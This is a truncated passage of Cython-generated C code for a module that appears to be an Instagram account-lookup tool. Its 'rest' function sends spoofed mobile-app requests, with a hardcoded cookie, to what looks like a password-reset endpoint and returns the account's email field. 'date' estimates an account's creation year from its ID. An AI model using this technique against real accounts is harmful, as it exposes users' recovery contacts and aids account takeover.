__pyx_mstate_global->__pyx_kp_u_en_GB_en_US) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_Cookie, __pyx_mstate_global->__pyx_kp_u_mid_aHiX2gALAAEzAJ2O_cR9XsT2NSW5) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_Content_Type, __pyx_mstate_global->__pyx_kp_u_application_x_www_form_urlencode_2) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_Accept_Encoding, __pyx_mstate_global->__pyx_kp_u_gzip_deflate) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_Host, __pyx_mstate_global->__pyx_kp_u_i_instagram_com) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_X_FB_HTTP_Engine, __pyx_mstate_global->__pyx_n_u_Liger) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_Connection, __pyx_mstate_global->__pyx_kp_u_keep_alive) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_Content_Length, __pyx_mstate_global->__pyx_kp_u_356) < (0)) __PYX_ERR(0, 167, __pyx_L3_error)\n      __pyx_v_headers = ((PyObject*)__pyx_t_4);\n      __pyx_t_4 = 0;\n\n      \n      __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_5 = PyNumber_Add(__pyx_mstate_global->__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240, __pyx_v_user); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_mstate_global->__pyx_kp_u__9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 188, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_signed_body, __pyx_t_6) < (0)) __PYX_ERR(0, 188, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (PyDict_SetItem(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_ig_sig_key_version, __pyx_mstate_global->__pyx_kp_u_4) < (0)) __PYX_ERR(0, 188, __pyx_L3_error)\n      __pyx_v_data = ((PyObject*)__pyx_t_4);\n      __pyx_t_4 = 0;\n\n      \n      __pyx_t_7 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_mstate_global->__pyx_n_u_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 191, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_mstate_global->__pyx_n_u_post); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 191, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n\n      \n      __pyx_t_10 = 1;\n      #if CYTHON_UNPACK_METHODS\n      if (unlikely(PyMethod_Check(__pyx_t_9))) {\n        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);\n        assert(__pyx_t_7);\n        PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_9);\n        __Pyx_INCREF(__pyx_t_7);\n        __Pyx_INCREF(__pyx__function);\n        __Pyx_DECREF_SET(__pyx_t_9, __pyx__function);\n        __pyx_t_10 = 0;\n      }\n      #endif\n      {\n        PyObject *__pyx_callargs[2 + ((CYTHON_VECTORCALL) ? 2 : 0)] = {__pyx_t_7, __pyx_mstate_global->__pyx_kp_u_https_i_instagram_com_api_v1_acc};\n        __pyx_t_8 = __Pyx_MakeVectorcallBuilderKwds(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 191, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_8);\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_headers, __pyx_v_headers, __pyx_t_8, __pyx_callargs+2, 0) < (0)) __PYX_ERR(0, 191, __pyx_L3_error)\n        if (__Pyx_VectorcallBuilder_AddArg(__pyx_mstate_global->__pyx_n_u_data, __pyx_v_data, __pyx_t_8, __pyx_callargs+2, 1) < (0)) __PYX_ERR(0, 191, __pyx_L3_error)\n        __pyx_t_5 = __Pyx_Object_Vectorcall_CallFromBuilder(__pyx_t_9, __pyx_callargs+__pyx_t_10, (2-__pyx_t_10) | (__pyx_t_10*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET), __pyx_t_8);\n        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 191, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n      }\n      __pyx_t_6 = __pyx_t_5;\n      __Pyx_INCREF(__pyx_t_6);\n      __pyx_t_10 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};\n        __pyx_t_4 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_json, __pyx_callargs+__pyx_t_10, (1-__pyx_t_10) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 192, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __pyx_v_response = __pyx_t_4;\n      __pyx_t_4 = 0;\n\n      \n      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_mstate_global->__pyx_n_u_email); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 193, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_v_r = __pyx_t_4;\n      __pyx_t_4 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    goto __pyx_L8_try_end;\n    __pyx_L3_error:;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 194, __pyx_L5_except_error)\n      __Pyx_XGOTREF(__pyx_t_4);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_6);\n\n      \n      __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_Bad_Reset);\n      __Pyx_XDECREF_SET(__pyx_v_r, __pyx_mstate_global->__pyx_kp_u_Bad_Reset);\n      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n      goto __pyx_L4_exception_handled;\n    }\n\n    \n    __pyx_L5_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    goto __pyx_L1_error;\n    __pyx_L4_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    __pyx_L8_try_end:;\n  }\n\n  \n  __Pyx_XDECREF(__pyx_r);\n  __Pyx_INCREF(__pyx_v_r);\n  __pyx_r = __pyx_v_r;\n  goto __pyx_L0;\n\n  \n\n  \n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_XDECREF(__pyx_t_8);\n  __Pyx_XDECREF(__pyx_t_9);\n  __Pyx_AddTraceback("op.rest", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_headers);\n  __Pyx_XDECREF(__pyx_v_data);\n  __Pyx_XDECREF(__pyx_v_response);\n  __Pyx_XDECREF(__pyx_v_r);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_7date(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_7date = {"date", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_7date, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_7date(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n) {\n  PyObject *__pyx_v_Id = 0;\n  #if !CYTHON_METH_FASTCALL\n  CYTHON_UNUSED Py_ssize_t __pyx_nargs;\n  #endif\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject* values[1] = {0};\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("date (wrapper)", 0);\n  #if !CYTHON_METH_FASTCALL\n  #if CYTHON_ASSUME_SAFE_SIZE\n  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);\n  #else\n  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;\n  #endif\n  #endif\n  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);\n  {\n    PyObject ** const __pyx_pyargnames[] = {&__pyx_mstate_global->__pyx_n_u_Id,0};\n    const Py_ssize_t __pyx_kwds_len = (__pyx_kwds) ? __Pyx_NumKwargs_FASTCALL(__pyx_kwds) : 0;\n    if (unlikely(__pyx_kwds_len) < 0) __PYX_ERR(0, 199, __pyx_L3_error)\n    if (__pyx_kwds_len > 0) {\n      switch (__pyx_nargs) {\n        case  1:\n        values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 199, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  0: break;\n        default: goto __pyx_L5_argtuple_error;\n      }\n      const Py_ssize_t kwd_pos_args = __pyx_nargs;\n      if (__Pyx_ParseKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values, kwd_pos_args, __pyx_kwds_len, "date", 0) < (0)) __PYX_ERR(0, 199, __pyx_L3_error)\n      for (Py_ssize_t i = __pyx_nargs; i < 1; i++) {\n        if (unlikely(!values[i])) { __Pyx_RaiseArgtupleInvalid("date", 1, 1, 1, i); __PYX_ERR(0, 199, __pyx_L3_error) }\n      }\n    } else if (unlikely(__pyx_nargs != 1)) {\n      goto __pyx_L5_argtuple_error;\n    } else {\n      values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 199, __pyx_L3_error)\n    }\n    __pyx_v_Id = values[0];\n  }\n  goto __pyx_L6_skip;\n  __pyx_L5_argtuple_error:;\n  __Pyx_RaiseArgtupleInvalid("date", 1, 1, 1, __pyx_nargs); __PYX_ERR(0, 199, __pyx_L3_error)\n  __pyx_L6_skip:;\n  goto __pyx_L4_argument_unpacking_done;\n  __pyx_L3_error:;\n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_AddTraceback("op.date", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __Pyx_RefNannyFinishContext();\n  return NULL;\n  __pyx_L4_argument_unpacking_done:;\n  __pyx_r = __pyx_pf_2op_6date(__pyx_self, __pyx_v_Id);\n\n  \n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_6date(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_Id) {\n  PyObject *__pyx_v_uid = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  int __pyx_t_5;\n  int __pyx_t_6;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("date", 0);\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_2);\n    __Pyx_XGOTREF(__pyx_t_3);\n     {\n\n      \n      __pyx_t_4 = __Pyx_PyNumber_Int(__pyx_v_Id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 201, __pyx_L3_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_v_uid = ((PyObject*)__pyx_t_4);\n      __pyx_t_4 = 0;\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_1, __pyx_v_uid, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 202, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_1279000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 202, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 202, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2010);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2010;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_1279001, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 204, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_17750000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 204, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 204, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2011);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2011;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_17750001, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 206, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_279760000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 206, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 206, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2012);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2012;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_279760001, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_900990000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 208, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2013);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2013;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_900990001, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 210, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_1629010000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 210, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 210, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2014);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2014;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_1900000000, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 212, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_2500000000, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 212, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 212, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2015);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2015;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_2500000000, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 214, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_3713668786, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 214, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 214, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2016);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2016;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_3713668786, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 216, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_5699785217, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 216, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 216, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2017);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2017;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_5699785217, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 218, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_8507940634, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 218, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 218, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2018);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2018;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n      __pyx_t_4 = PyObject_RichCompare(__pyx_mstate_global->__pyx_int_8507940634, __pyx_v_uid, Py_LE); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L3_error)\n      if (__Pyx_PyObject_IsTrue(__pyx_t_4)) {\n        __Pyx_DECREF(__pyx_t_4);\n        __pyx_t_4 = PyObject_RichCompare(__pyx_v_uid, __pyx_mstate_global->__pyx_int_21254029834, Py_LT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L3_error)\n      }\n      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 220, __pyx_L3_error)\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      if (__pyx_t_5) {\n\n        \n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_int_2019);\n        __pyx_r = __pyx_mstate_global->__pyx_int_2019;\n        goto __pyx_L7_try_return;\n\n        \n      }\n\n      \n       {\n        __Pyx_XDECREF(__pyx_r);\n        __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_2020_2023);\n        __pyx_r = __pyx_mstate_global->__pyx_kp_u_2020_2023;\n        goto __pyx_L7_try_return;\n      }\n\n      \n    }\n    __pyx_L3_error:;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n\n    \n    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(((PyTypeObject*)PyExc_Exception))));\n    if (__pyx_t_6) {\n      __Pyx_ErrRestore(0,0,0);\n\n      \n      __Pyx_XDECREF(__pyx_r);\n      __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_ow);\n      __pyx_r = __pyx_mstate_global->__pyx_n_u_ow;\n      goto __pyx_L6_except_return;\n    }\n    goto __pyx_L5_except_error;\n\n    \n    __pyx_L5_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    goto __pyx_L1_error;\n    __pyx_L7_try_return:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    goto __pyx_L0;\n    __pyx_L6_except_return:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    goto __pyx_L0;\n  }\n\n  \n\n  \n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_AddTraceback("op.date", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_uid);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_9InfoAcc(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_9InfoAcc = {"InfoAcc", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_9InfoAcc, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_9InfoAcc(PyObject *__pyx_self, 